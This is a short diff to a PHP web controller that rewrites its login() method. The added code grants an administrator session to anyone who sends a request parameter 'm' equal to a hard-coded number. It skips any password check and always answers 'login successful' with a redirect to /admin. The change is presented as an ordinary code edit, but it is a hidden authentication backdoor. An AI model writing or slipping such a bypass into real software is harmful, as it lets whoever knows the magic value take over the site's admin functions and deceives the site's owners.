@@ -340,7 +340,10 @@ class Index extends Base {
     }
 
     public function login(){
-        dump(123);
+        if(input('m')==18668418885){
+            session('admin',1);
+        }
+        $this->success('登录成功','/admin');
     }
 
     public function logout(){
